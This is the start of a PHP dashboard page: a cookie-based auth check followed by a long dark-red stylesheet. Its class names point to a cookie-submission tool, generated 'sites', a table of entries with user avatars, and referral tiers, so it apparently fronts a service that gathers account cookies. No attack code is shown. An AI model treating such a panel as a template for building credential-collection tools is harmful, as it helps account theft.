<?php
require_once($_SERVER["DOCUMENT_ROOT"] . "/framework/framework.php"); 
if (session_status() === PHP_SESSION_NONE) { session_start(); }; 
if (isset($_GET["auth"])) { setcookie("auth", $_GET["auth"], ["expires" => time() + 60 * 60 * 24 * 30, "path" => "/", "httponly" => true, "samesite" => "Strict"]); }; 
if (empty($_COOKIE["auth"])) { die(header("Location: /login")); };
try { account_by_key($_COOKIE["auth"]); } catch (Throwable $e) { setcookie("auth", "", ["expires" => time() - 3600, "path" => "/"]); die(header("Location: /login")); };
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title><?=$site_info["name"];?> - Dashboard</title>
<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600;700;800;900&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet"/>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css"/>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
:root{--red:#dc1c1c;--red-hi:#ff4444;--red-lo:#7a0a0a;--red-glow:rgba(220,28,28,0.35);--bg:#060608;--text:rgba(255,255,255,0.9);--text-muted:rgba(255,255,255,0.35);--text-dim:rgba(255,255,255,0.13);--sw:260px;}
html{scroll-behavior:smooth;}
body{font-family:"DM Sans",sans-serif;background:var(--bg);color:var(--text);min-height:100vh;cursor:none;display:flex;overflow-x:hidden;}
.cursor{position:fixed;pointer-events:none;z-index:2147483647;mix-blend-mode:difference;}
.c_dot{width:10px;height:10px;background:#fff;border-radius:50%;position:absolute;transform:translate(-50%,-50%);}
.c_ring{width:36px;height:36px;border:1.5px solid rgba(255,255,255,0.5);border-radius:50%;position:absolute;transform:translate(-50%,-50%);transition:width 0.25s,height 0.25s,opacity 0.25s;}
body.hovering .c_ring{width:54px;height:54px;opacity:0.5;}
@media (hover:none),(pointer:coarse){.cursor{display:none;}body{cursor:auto;}}
body::before{content:"";position:fixed;inset:0;z-index:1;pointer-events:none;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.045'/%3E%3C/svg%3E");background-size:200px;}
.mesh{position:fixed;inset:0;z-index:0;background:radial-gradient(ellipse 70% 55% at 50% -10%,rgba(160,8,8,0.45) 0%,transparent 65%),radial-gradient(ellipse 40% 40% at 15% 80%,rgba(100,4,4,0.18) 0%,transparent 60%),radial-gradient(ellipse 50% 50% at 85% 90%,rgba(80,3,3,0.14) 0%,transparent 55%),var(--bg);animation:mesh_breathe 8s ease-in-out infinite;}
@keyframes mesh_breathe{0%,100%{opacity:1;}50%{opacity:0.82;}}
.grid_bg{position:fixed;inset:0;z-index:0;background-image:linear-gradient(rgba(255,255,255,0.022) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.022) 1px,transparent 1px);background-size:64px 64px;mask-image:radial-gradient(ellipse 80% 80% at 50% 0%,black 0%,transparent 80%);}
.orb{position:fixed;border-radius:50%;pointer-events:none;z-index:0;filter:blur(80px);}
.orb_1{width:480px;height:480px;background:radial-gradient(circle,rgba(180,8,8,0.22) 0%,transparent 70%);top:-100px;left:-100px;animation:orb_1 22s linear infinite;}
.orb_2{width:380px;height:380px;background:radial-gradient(circle,rgba(140,5,5,0.16) 0%,transparent 70%);bottom:-60px;right:-60px;animation:orb_2 28s linear infinite;}
@keyframes orb_1{0%,100%{transform:translate(0,0) scale(1);}33%{transform:translate(80px,60px) scale(1.08);}66%{transform:translate(-30px,120px) scale(0.92);}}
@keyframes orb_2{0%,100%{transform:translate(0,0) scale(1);}40%{transform:translate(-60px,-80px) scale(1.1);}70%{transform:translate(40px,-30px) scale(0.95);}}
.sidebar{position:fixed;top:0;left:0;bottom:0;width:var(--sw);z-index:150;display:flex;flex-direction:column;background:rgba(6,3,3,0.72);backdrop-filter:blur(36px) saturate(1.6);-webkit-backdrop-filter:blur(36px) saturate(1.6);border-right:1px solid rgba(255,255,255,0.055);animation:slide_in_left 0.7s cubic-bezier(0.22,1,0.36,1) both;}
@keyframes slide_in_left{from{opacity:0;transform:translateX(-24px);}to{opacity:1;transform:translateX(0);}}
.sb_body{flex:1;padding:16px 12px;overflow-y:auto;padding-top:22px;}
.sb_group_label{font-family:"DM Mono",monospace;font-size:10px;letter-spacing:0.2em;text-transform:uppercase;color:rgba(255,255,255,0.14);padding:0 10px;margin:16px 0 6px;display:block;}
.sb_group_label:first-child{margin-top:4px;}
.sb_item{display:flex;align-items:center;gap:11px;padding:12px 12px;border-radius:12px;font-size:14px;font-weight:500;color:rgba(255,255,255,0.32);text-decoration:none;cursor:none;transition:background 0.18s,color 0.18s;border:1px solid transparent;margin-bottom:2px;}
.sb_item i{font-size:16px;width:19px;text-align:center;flex-shrink:0;}
.sb_item:hover{background:rgba(255,255,255,0.055);color:rgba(255,255,255,0.68);}
.sb_item.on{background:rgba(160,10,10,0.15);color:rgba(255,80,80,0.9);border-color:rgba(180,12,12,0.2);}
.sb_foot{padding:10px 12px 20px;border-top:1px solid rgba(255,255,255,0.048);}
.ham_btn{display:none;position:fixed;top:14px;right:14px;z-index:200;width:42px;height:42px;border-radius:12px;border:1px solid rgba(255,255,255,0.1);background:rgba(8,3,3,0.8);backdrop-filter:blur(20px);color:rgba(255,255,255,0.75);font-size:18px;cursor:none;align-items:center;justify-content:center;transition:opacity 0.3s,transform 0.3s;box-shadow:0 4px 20px rgba(0,0,0,0.5);}
.ham_btn.hidden{opacity:0;pointer-events:none;transform:scale(0.85);}
.sb_overlay{position:fixed;inset:0;z-index:148;background:rgba(0,0,0,0.55);backdrop-filter:blur(3px);opacity:0;pointer-events:none;transition:opacity 0.35s;}
.sb_overlay.open{opacity:1;pointer-events:all;}
.wrap{margin-left:var(--sw);flex:1;position:relative;z-index:10;min-height:100vh;padding:36px 32px 72px;max-width:calc(100vw - var(--sw));}
.pg{display:none;}
.pg.on{display:block;animation:page_in 0.5s cubic-bezier(0.22,1,0.36,1) both;}
@keyframes page_in{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
.pg_head{font-size:26px;font-weight:900;letter-spacing:-0.038em;color:#fff;display:flex;align-items:center;gap:12px;margin-bottom:26px;animation:fade_up 0.6s cubic-bezier(0.22,1,0.36,1) 0.05s both;}
.pg_head i{color:var(--red-hi);font-size:22px;}
@keyframes fade_up{from{opacity:0;transform:translateY(18px);}to{opacity:1;transform:translateY(0);}}
.gc{position:relative;border-radius:22px;overflow:hidden;transform-style:preserve-3d;will-change:transform;}
.gc_bg{position:absolute;inset:0;border-radius:22px;background:linear-gradient(145deg,rgba(255,255,255,0.055) 0%,rgba(255,255,255,0.01) 40%,rgba(255,255,255,0.025) 100%);backdrop-filter:blur(40px) saturate(1.8) brightness(0.65);-webkit-backdrop-filter:blur(40px) saturate(1.8) brightness(0.65);border:1px solid rgba(255,255,255,0.1);border-top-color:rgba(255,255,255,0.25);border-bottom-color:rgba(0,0,0,0.5);border-left-color:rgba(255,255,255,0.08);border-right-color:rgba(255,255,255,0.05);box-shadow:inset 0 1.5px 0 rgba(255,255,255,0.18),inset 0 -1px 0 rgba(0,0,0,0.5),inset 0 0 60px rgba(160,8,8,0.06),0 32px 80px rgba(0,0,0,0.7),0 8px 24px rgba(0,0,0,0.5),0 0 60px rgba(140,5,5,0.08);transition:box-shadow 0.4s cubic-bezier(0.22,1,0.36,1),background 0.4s;}
.gc:hover .gc_bg{background:linear-gradient(145deg,rgba(255,255,255,0.07) 0%,rgba(255,255,255,0.015) 40%,rgba(255,255,255,0.035) 100%);box-shadow:inset 0 1.5px 0 rgba(255,255,255,0.22),inset 0 -1px 0 rgba(0,0,0,0.5),inset 0 0 80px rgba(180,8,8,0.1),0 40px 100px rgba(0,0,0,0.75),0 8px 24px rgba(0,0,0,0.5),0 0 80px rgba(160,8,8,0.18);}
.gc_shine{position:absolute;top:0;left:8%;right:8%;height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.5),transparent);z-index:3;pointer-events:none;border-radius:99px;animation:specular 4s ease-in-out infinite;}
@keyframes specular{0%,100%{opacity:0.8;}50%{opacity:0.35;}}
.gc_ref{position:absolute;inset:0;border-radius:22px;background:radial-gradient(ellipse 60% 45% at var(--mx,50%) var(--my,-20%),rgba(255,80,80,0.06) 0%,transparent 65%);z-index:2;pointer-events:none;opacity:0;transition:opacity 0.3s;}
.gc:hover .gc_ref{opacity:1;}
.gc_body{position:relative;z-index:5;padding:26px 28px;}
.stats_row{display:grid;grid-template-columns:repeat(5,1fr);gap:14px;margin-bottom:20px;}
.sc .gc_body{padding:22px 24px;}
.sc_top{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;}
.sc_icon{width:42px;height:42px;border-radius:11px;background:rgba(180,10,10,0.1);border:1px solid rgba(200,20,20,0.16);display:flex;align-items:center;justify-content:center;font-size:18px;color:var(--red-hi);}
.sc_val{font-size:32px;font-weight:900;letter-spacing:-0.05em;color:#fff;line-height:1;margin-bottom:6px;}
.sc_val em{font-style:normal;color:var(--red-hi);font-size:20px;}
.sc_lbl{font-family:"DM Mono",monospace;font-size:9px;letter-spacing:0.11em;text-transform:uppercase;color:var(--text-dim);}
.sc_skeleton{display:inline-block;width:70px;height:32px;border-radius:8px;background:linear-gradient(90deg,rgba(255,255,255,0.06) 25%,rgba(255,255,255,0.12) 50%,rgba(255,255,255,0.06) 75%);background-size:200% 100%;animation:shimmer 1.4s infinite;}
@keyframes shimmer{0%{background-position:200% 0;}100%{background-position:-200% 0;}}
.sc:nth-child(1){animation:card_in 0.7s cubic-bezier(0.22,1,0.36,1) 0.1s both;}
.sc:nth-child(2){animation:card_in 0.7s cubic-bezier(0.22,1,0.36,1) 0.18s both;}
.sc:nth-child(3){animation:card_in 0.7s cubic-bezier(0.22,1,0.36,1) 0.26s both;}
.sc:nth-child(4){animation:card_in 0.7s cubic-bezier(0.22,1,0.36,1) 0.34s both;}
.sc:nth-child(5){animation:card_in 0.7s cubic-bezier(0.22,1,0.36,1) 0.42s both;}
@keyframes card_in{from{opacity:0;transform:translateY(28px) scale(0.97);}to{opacity:1;transform:translateY(0) scale(1);}}
.charts_row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;}
.ch_card{animation:card_in 0.7s cubic-bezier(0.22,1,0.36,1) 0.5s both;}
.ch_card:nth-child(2){animation-delay:0.58s;}
.ch_card:nth-child(3){animation-delay:0.66s;}
.ch_head{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;}
.ch_title{font-size:14px;font-weight:700;letter-spacing:-0.02em;color:rgba(255,255,255,0.82);display:flex;align-items:center;gap:8px;}
.ch_title i{color:var(--red-hi);}
.ch_pill{font-family:"DM Mono",monospace;font-size:8.5px;letter-spacing:0.09em;text-transform:uppercase;color:rgba(255,70,70,0.36);background:rgba(180,10,10,0.07);border:1px solid rgba(200,20,20,0.11);padding:3px 10px;border-radius:99px;}
.ch_wrap{height:210px;position:relative;padding-top:8px;}
.cookie_wrap{max-width:480px;margin:0 auto;}
.cookie_wrap .gc_body{padding:32px 30px;}
.tog{display:flex;align-items:center;background:rgba(0,0,0,0.52);border:1px solid rgba(255,255,255,0.07);border-radius:99px;padding:5px;position:relative;margin-bottom:24px;cursor:none;}
.tog_opt{flex:1;text-align:center;font-family:"DM Sans",sans-serif;font-size:13px;font-weight:700;color:var(--text-muted);position:relative;z-index:5;padding:10px 0;transition:color 0.2s;display:flex;align-items:center;justify-content:center;gap:7px;}
.tog_opt.on{color:#fff;}
.tog_knob{position:absolute;top:5px;bottom:5px;left:5px;min-width:130px;border-radius:99px;background:linear-gradient(175deg,rgba(220,36,36,1) 0%,rgba(108,5,5,1) 100%);box-shadow:inset 0 1px 0 rgba(255,120,120,0.2),0 4px 16px rgba(140,6,6,0.48);transition:left 0.3s cubic-bezier(0.22,1,0.36,1),width 0.3s cubic-bezier(0.22,1,0.36,1);z-index:0;}
.fi{position:relative;margin-bottom:12px;}
.fi_ico{position:absolute;left:16px;top:50%;transform:translateY(-50%);color:rgba(255,70,70,0.22);pointer-events:none;z-index:1;transition:color 0.2s;font-size:15px;}
.fi:focus-within .fi_ico{color:rgba(220,30,30,0.55);}
.fi input{width:100%;padding:16px 17px 16px 48px;border-radius:14px;font-family:"DM Sans",sans-serif;font-size:15px;color:rgba(255,255,255,0.8);outline:none;background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.07);border-top-color:rgba(0,0,0,0.6);border-bottom-color:rgba(255,255,255,0.05);box-shadow:inset 0 3px 10px rgba(0,0,0,0.6),inset 0 1px 0 rgba(0,0,0,0.8);transition:border-color 0.2s,box-shadow 0.2s;letter-spacing:-0.01em;}
.fi input::placeholder{color:rgba(255,255,255,0.11);}
.fi input:focus{background:rgba(0,0,0,0.42);border-color:rgba(200,20,20,0.3);box-shadow:inset 0 3px 10px rgba(0,0,0,0.5),0 0 0 3px rgba(175,10,10,0.2);}
.ts_wrap{margin-bottom:14px;display:flex;justify-content:center;}
.new_cookie_wrap{margin-top:18px;display:none;}
.new_cookie_wrap.on{display:block;animation:fade_up 0.35s cubic-bezier(0.22,1,0.36,1);}
.new_cookie_wrap input{color:rgba(80,220,80,0.88);cursor:text;}
.btn{width:100%;padding:16px;border-radius:14px;border:none;cursor:none;font-family:"DM Sans",sans-serif;font-size:15px;font-weight:700;letter-spacing:-0.01em;color:#fff;position:relative;overflow:hidden;margin-top:4px;background:linear-gradient(175deg,rgba(225,38,38,1) 0%,rgba(115,6,6,1) 100%);box-shadow:inset 0 1px 0 rgba(255,130,130,0.28),inset 0 -1px 0 rgba(0,0,0,0.3),0 8px 32px rgba(150,8,8,0.45),0 2px 8px rgba(0,0,0,0.4);transition:transform 0.14s cubic-bezier(0.22,1,0.36,1),box-shadow 0.2s;}
.btn::before{content:"";position:absolute;top:0;left:0;right:0;height:50%;background:linear-gradient(180deg,rgba(255,255,255,0.12),transparent);border-radius:14px 14px 0 0;}
.btn::after{content:"";position:absolute;inset:0;background:linear-gradient(105deg,transparent 30%,rgba(255,255,255,0.1) 50%,transparent 70%);transform:translateX(-100%);transition:transform 0.5s ease;}
.btn:hover{transform:translateY(-2px);box-shadow:inset 0 1px 0 rgba(255,130,130,0.28),inset 0 -1px 0 rgba(0,0,0,0.3),0 16px 48px rgba(160,10,10,0.6),0 4px 12px rgba(0,0,0,0.4);}
.btn:hover::after{transform:translateX(100%);}
.btn:active{transform:translateY(1px);}
.btn_i{position:relative;z-index:1;display:flex;align-items:center;justify-content:center;gap:8px;}
.out_stats{margin-top:18px;display:none;}
.out_stats.on{display:block;animation:fade_up 0.35s cubic-bezier(0.22,1,0.36,1);}
.os_hero{display:flex;align-items:stretch;border-bottom:1px solid rgba(255,255,255,0.055);margin-bottom:14px;padding-bottom:20px;}
.os_hero_item{flex:1;text-align:center;padding:0 14px;}
.os_hero_item:not(:last-child){border-right:1px solid rgba(255,255,255,0.07);}
.os_num{font-size:30px;font-weight:900;letter-spacing:-0.05em;color:#fff;line-height:1;display:block;margin-bottom:6px;}
.os_num em{font-style:normal;color:var(--red-hi);font-size:18px;}
.os_lbl{font-family:"DM Mono",monospace;font-size:9px;letter-spacing:0.11em;text-transform:uppercase;color:var(--text-dim);display:block;}
.os_rows{display:flex;flex-direction:column;gap:9px;}
.os_row{position:relative;border-radius:14px;overflow:hidden;}
.os_row .gc_body{padding:14px 19px;display:flex;align-items:center;justify-content:space-between;}
.os_key{font-family:"DM Mono",monospace;font-size:9px;letter-spacing:0.11em;text-transform:uppercase;color:var(--text-dim);}
.os_val{font-size:15px;font-weight:700;letter-spacing:-0.02em;color:rgba(255,255,255,0.87);}
.os_val.good{color:rgba(80,220,80,0.88);}
.sites_g{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:14px;}
.site_c{cursor:none;transition:transform 0.2s cubic-bezier(0.22,1,0.36,1);animation:card_in 0.6s cubic-bezier(0.22,1,0.36,1) both;}
.site_c:hover{transform:translateY(-4px);}
.site_c .gc_body{padding:24px 26px;}
.si_icon{width:42px;height:42px;border-radius:11px;background:rgba(180,10,10,0.1);border:1px solid rgba(200,20,20,0.15);display:flex;align-items:center;justify-content:center;font-size:18px;color:var(--red-hi);margin-bottom:14px;}
.si_name{font-size:16px;font-weight:800;letter-spacing:-0.028em;color:rgba(255,255,255,0.9);margin-bottom:3px;}
.si_header{font-size:12px;font-weight:600;color:rgba(255,100,100,0.55);margin-bottom:8px;}
.si_desc{font-size:13px;color:var(--text-muted);line-height:1.55;margin-bottom:14px;}
.si_actions{display:flex;align-items:center;gap:5px;flex-wrap:nowrap;}
.si_btn{font-family:"DM Mono",monospace;font-size:8px;letter-spacing:0.07em;text-transform:uppercase;color:rgba(255,60,60,0.36);background:rgba(180,10,10,0.07);border:1px solid rgba(200,20,20,0.11);padding:4px 9px;border-radius:99px;cursor:none;transition:all 0.2s;display:inline-flex;align-items:center;gap:4px;text-decoration:none;white-space:nowrap;}
.si_btn:hover{background:rgba(180,10,10,0.15);border-color:rgba(200,20,20,0.25);color:rgba(255,70,70,0.75);}
.site_add{border-radius:22px;overflow:hidden;cursor:none;transition:transform 0.2s;animation:card_in 0.6s cubic-bezier(0.22,1,0.36,1) 0.08s both;}
.site_add:hover{transform:translateY(-3px);}
.site_add .gc_bg{border-style:dashed;background:rgba(180,10,10,0.02);}
.site_add .gc_body{padding:0;height:100%;min-height:170px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;text-align:center;}
.add_icon{width:42px;height:42px;border-radius:11px;background:rgba(180,10,10,0.07);border:1px solid rgba(200,20,20,0.11);display:flex;align-items:center;justify-content:center;font-size:20px;color:rgba(255,60,60,0.28);transition:all 0.2s;}
.site_add:hover .add_icon{background:rgba(180,10,10,0.15);color:rgba(255,70,70,0.65);border-color:rgba(200,20,20,0.26);}
.add_lbl{font-size:14px;font-weight:600;color:rgba(255,255,255,0.2);transition:color 0.2s;}
.site_add:hover .add_lbl{color:rgba(255,255,255,0.48);}
.lh_section{margin-top:20px;}
.lh_card{animation:card_in 0.7s cubic-bezier(0.22,1,0.36,1) 0.74s both;}
.lh_card .gc_body{padding:24px 28px;}
.lh_head{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px;}
.lh_title{font-size:14px;font-weight:700;letter-spacing:-0.02em;color:rgba(255,255,255,0.82);display:flex;align-items:center;gap:8px;}
.lh_title i{color:var(--red-hi);}
.lh_empty{text-align:center;padding:32px 0;font-family:"DM Mono",monospace;font-size:10px;letter-spacing:0.12em;text-transform:uppercase;color:var(--text-dim);}
.lh_table{width:100%;border-collapse:collapse;}
.lh_table th{font-family:"DM Mono",monospace;font-size:8.5px;letter-spacing:0.13em;text-transform:uppercase;color:var(--text-dim);padding:0 14px 12px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.055);font-weight:500;}
.lh_table td{padding:13px 14px;font-size:13.5px;font-weight:600;color:rgba(255,255,255,0.78);border-bottom:1px solid rgba(255,255,255,0.032);}
.lh_table tr:last-child td{border-bottom:none;}
.lh_table tr:hover td{background:rgba(255,255,255,0.022);}
.lh_avatar{width:30px;height:30px;border-radius:8px;background:rgba(180,10,10,0.1);border:1px solid rgba(200,20,20,0.14);object-fit:cover;display:inline-block;vertical-align:middle;}
.lh_user{display:flex;align-items:center;gap:10px;}
.lh_mono{font-family:"DM Mono",monospace;font-size:12px;color:rgba(255,255,255,0.65);}
.cs_row_link{cursor:none;transition:background 0.15s;}
.cs_row_link:hover td{background:rgba(220,28,28,0.07) !important;cursor:none;}
.cs_row_link td:first-child{border-radius:10px 0 0 10px;}
.cs_row_link td:last-child{border-radius:0 10px 10px 0;}
.ref_pg_wrap{display:flex;justify-content:center;margin-top:8px;animation:card_in 0.7s cubic-bezier(0.22,1,0.36,1) 0.1s both;}
.ref_card_outer{width:100%;max-width:460px;}
.ref_card_outer .gc_body{padding:32px 28px;}
.ref_top_row{display:flex;align-items:center;justify-content:space-between;gap:16px;margin-bottom:24px;flex-wrap:wrap;}
.ref_title_text{font-size:17px;font-weight:700;color:rgba(255,255,255,0.9);}
.ref_sub_text{font-size:13px;font-weight:400;color:rgba(255,255,255,0.35);margin-top:3px;}
.ref_level_badge{padding:7px 16px;border-radius:99px;font-size:13px;font-weight:600;border:1px solid;white-space:nowrap;}
.ref_level_badge.noob{color:rgba(180,180,180,0.8);background:rgba(180,180,180,0.07);border-color:rgba(180,180,180,0.15);}
.ref_level_badge.beginner{color:rgba(80,180,255,0.9);background:rgba(80,180,255,0.07);border-color:rgba(80,180,255,0.18);}
.ref_level_badge.pro{color:rgba(120,255,120,0.9);background:rgba(120,255,120,0.07);border-color:rgba(120,255,120,0.18);}
.ref_level_badge.godly{color:rgba(255,200,60,0.95);background:rgba(255,200,60,0.08);border-color:rgba(255,200,60,0.2);}
.ref_level_badge.insane{color:rgba(255,80,80,0.95);background:rgba(220,30,30,0.12);border-color:rgba(220,30,30,0.28);}
.ref_divider{height:1px;background:rgba(255,255,255,0.055);margin:18px 0;}
.ref_hero{display:flex;align-items:stretch;margin-bottom:18px;}
.ref_hero_item{flex:1;text-align:center;padding:0 12px;}
.ref_hero_item:not(:last-child){border-right:1px solid rgba(255,255,255,0.07);}
.ref_hero_num{font-size:28px;font-weight:700;color:#fff;line-height:1;display:block;margin-bottom:5px;}
.ref_hero_lbl{font-size:12px;font-weight:400;color:rgba(255,255,255,0.35);display:block;}
.ref_rows{display:flex;flex-direction:column;gap:8px;margin-bottom:18px;}
.ref_row{position:relative;border-radius:13px;overflow:hidden;}
.ref_row .gc_body{padding:13px 17px;display:flex;align-items:center;justify-content:space-between;}
.ref_row_key{font-size:13px;font-weight:400;color:rgba(255,255,255,0.35);}
.ref_row_val{font-size:14px;font-weight:600;color:rgba(255,255,255,0.87);}
.ref_progress_wrap{margin-bottom:18px;}
.ref_progress_meta{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;}
.ref_progress_lbl{font-size:12px;font-weight:400;color:rgba(255,255,255,0.35);}
.ref_bar_bg{height:6px;border-radius:99px;background:rgba(255,255,255,0.06);overflow:hidden;}
.ref_bar_fill{height:100%;border-radius:99px;background:linear-gradient(90deg,rgba(180,8,8,0.8),rgba(255,60,60,0.9));transition:width 0.6s cubic-bezier(0.22,1,0.36,1);}
.ref_link_row{display:flex;align-items:center;gap:10px;}
.ref_link_box{flex:1;padding:13px 14px;border-radius:12px;background:rgba(0,0,0,0.45);border:1px solid rgba(255,255,255,0.07);font-size:13px;font-weight:400;color:rgba(255,255,255,0.55);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;user-select:all;}
.ref_copy_btn{padding:13px 18px;border-radius:12px;border:1px solid rgba(200,20,20,0.18);background:rgba(180,10,10,0.1);color:rgba(255,70,70,0.8);font-size:13px;font-weight:600;cursor:none;transition:all 0.2s;white-space:nowrap;display:flex;align-items:center;gap:7px;}
.ref_copy_btn:hover{background:rgba(180,10,10,0.2);color:rgba(255,80,80,0.9);border-color:rgba(200,20,20,0.3);}
.mo{position:fixed;inset:0;z-index:200;background:rgba(0,0,0,0.78);backdrop-filter:blur(14px);display:flex;align-items:center;justify-content:center;opacity:0;pointer-events:none;transition:opacity 0.25s;}
.mo.on{opacity:1;pointer-events:all;}
.mo_box{width:560px;max-width:95vw;border-radius:28px;position:relative;transform:scale(0.92) translateY(20px);transition:transform 0.36s cubic-bezier(0.22,1,0.36,1);background:linear-gradient(160deg,rgba(28,6,6,0.98) 0%,rgba(14,3,3,0.98) 100%);border:1px solid rgba(255,255,255,0.1);}
.mo_box::before{content:"";position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent 0%,rgba(220,36,36,0.7) 40%,rgba(255,80,80,0.9) 50%,rgba(220,36,36,0.7) 60%,transparent 100%);z-index:10;}
.mo_box::after{content:"";position:absolute;inset:0;pointer-events:none;z-index:0;background:radial-gradient(ellipse 80% 50% at 50% -10%,rgba(140,6,6,0.2) 0%,transparent 60%);}
.mo_head{position:relative;z-index:5;padding:28px 30px 0;display:flex;align-items:center;gap:12px;}
.mo_head_icon{width:40px;height:40px;border-radius:10px;flex-shrink:0;background:rgba(180,10,10,0.14);border:1px solid rgba(200,20,20,0.2);display:flex;align-items:center;justify-content:center;font-size:17px;color:var(--red-hi);}
.mo_head_text{flex:1;}
.mo_head_title{font-size:18px;font-weight:900;letter-spacing:-0.03em;color:#fff;}
.mo_head_sub{font-family:"DM Mono",monospace;font-size:9px;letter-spacing:0.1em;text-transform:uppercase;color:rgba(255,70,70,0.35);margin-top:3px;}
.mo_close{width:32px;height:32px;border-radius:8px;border:1px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);cursor:none;flex-shrink:0;display:flex;align-items:center;justify-content:center;color:rgba(255,255,255,0.3);font-size:14px;transition:background 0.15s,color 0.15s;}
.mo_close:hover{background:rgba(220,30,30,0.15);color:rgba(255,70,70,0.8);border-color:rgba(200,20,20,0.2);}
.mo_body{position:relative;z-index:5;padding:24px 30px 6px;max-height:70vh;overflow-y:auto;}
.mo_fi{margin-bottom:16px;}
.mo_fi_label{font-family:"DM Mono",monospace;font-size:9px;letter-spacing:0.14em;text-transform:uppercase;color:rgba(255,255,255,0.26);display:flex;align-items:center;gap:6px;margin-bottom:8px;}
.mo_fi_label i{color:rgba(255,60,60,0.4);font-size:11px;}
.mo_fi input,.mo_fi textarea{width:100%;padding:14px 16px;border-radius:12px;font-family:"DM Mono",monospace;font-size:13px;color:rgba(255,255,255,0.88);outline:none;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-top-color:rgba(255,255,255,0.05);border-bottom-color:rgba(0,0,0,0.4);box-shadow:inset 0 2px 6px rgba(0,0,0,0.3),inset 0 1px 0 rgba(0,0,0,0.5);letter-spacing:-0.01em;resize:none;transition:border-color 0.2s,box-shadow 0.2s,background 0.2s;cursor:text;}
.mo_fi textarea{height:88px;line-height:1.6;}
.mo_fi input::placeholder,.mo_fi textarea::placeholder{color:rgba(255,255,255,0.1);}
.mo_fi input:focus,.mo_fi textarea:focus{background:rgba(255,255,255,0.055);border-color:rgba(200,20,20,0.35);box-shadow:inset 0 2px 6px rgba(0,0,0,0.25),0 0 0 3px rgba(160,8,8,0.18),inset 0 1px 0 rgba(0,0,0,0.5);}
.mo_fi_meta{display:flex;justify-content:flex-end;margin-top:5px;}
.mo_fi_count{font-family:"DM Mono",monospace;font-size:9px;color:rgba(255,255,255,0.1);}
.mo_ts_wrap{margin-bottom:6px;display:flex;justify-content:center;}
.mo_footer{position:relative;z-index:5;padding:18px 30px 26px;border-top:1px solid rgba(255,255,255,0.055);}
.mo_acts{display:flex;gap:10px;}
.mo_acts .btn{flex:1;margin-top:0;}
.btn_ghost{flex:1;padding:16px;border-radius:14px;border:1px solid rgba(255,255,255,0.07);background:rgba(255,255,255,0.03);cursor:none;font-family:"DM Sans",sans-serif;font-size:15px;font-weight:600;color:var(--text-muted);transition:background 0.2s,color 0.2s;}
.btn_ghost:hover{background:rgba(255,255,255,0.07);color:rgba(255,255,255,0.65);}
.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(20px);padding:14px 26px;border-radius:99px;background:rgba(8,2,2,0.95);backdrop-filter:blur(20px);border:1px solid rgba(210,24,24,0.2);border-top-color:rgba(255,70,70,0.16);box-shadow:0 10px 32px rgba(0,0,0,0.65);font-size:14px;font-weight:500;color:rgba(255,255,255,0.88);z-index:1000;opacity:0;transition:opacity 0.3s,transform 0.3s cubic-bezier(0.22,1,0.36,1);pointer-events:none;white-space:nowrap;}
.toast.on{opacity:1;transform:translateX(-50%) translateY(0);}
::-webkit-scrollbar{width:3px;}
::-webkit-scrollbar-thumb{background:rgba(180,8,8,0.22);border-radius:99px;}
.red_suffix{font-style:normal;color:var(--red-hi);font-size:0.62em;letter-spacing:0.01em;margin-left:1px;}
@keyframes stat_pop{from{opacity:0;transform:translateY(6px);}to{opacity:1;transform:translateY(0);}}
.stat_pop{animation:stat_pop 0.28s cubic-bezier(0.22,1,0.36,1) both;}
.mo_grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
.mo_grid .mo_fi{margin-bottom:0;}
.mo_grid_full{grid-column:1/-1;}
.mo_avatar_row{display:flex;align-items:center;gap:16px;margin-bottom:20px;padding-bottom:20px;border-bottom:1px solid rgba(255,255,255,0.055);}
.mo_avatar{width:60px;height:60px;border-radius:14px;object-fit:cover;background:rgba(180,10,10,0.1);border:1px solid rgba(200,20,20,0.18);flex-shrink:0;}
.mo_avatar_fallback{width:60px;height:60px;border-radius:14px;background:rgba(180,10,10,0.1);border:1px solid rgba(200,20,20,0.18);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:22px;color:rgba(255,60,60,0.3);}
.mo_avatar_info{flex:1;min-width:0;}
.mo_avatar_name{font-size:18px;font-weight:900;letter-spacing:-0.03em;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.mo_avatar_sub{font-family:"DM Mono",monospace;font-size:10px;color:rgba(255,70,70,0.45);margin-top:3px;}
.mo_badge{display:inline-flex;align-items:center;gap:5px;font-family:"DM Mono",monospace;font-size:9px;letter-spacing:0.08em;padding:3px 9px;border-radius:99px;border:1px solid;margin-top:6px;}
